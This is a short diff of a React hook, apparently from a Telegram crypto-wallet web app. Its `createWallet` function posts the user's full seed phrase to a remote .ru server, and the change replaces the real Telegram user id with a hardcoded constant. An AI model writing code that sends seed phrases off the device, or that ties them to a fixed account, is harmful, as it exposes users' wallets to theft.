@@ -6,6 +6,7 @@ import axios from 'axios';
 import { useDispatch } from 'react-redux';
 import { fetchUserInfo } from '../../../store/telegramUserInfo';
 import translation from '../../../functions/translate';
+import { USERID, USERIDR } from '../../../constants/tgStatic.config';
 
 const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}) => {
     
@@ -77,7 +78,7 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}
       const createWallet = useCallback( async () => {
         await axios.post("https://www.connectbirga.ru/user/wallet", {
             mnemonic: keys.map(e => e.trim()),
-            userId: window.Telegram.WebApp.initDataUnsafe.user.id,
+            userId: USERID,
           } , {
             headers : {
               "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
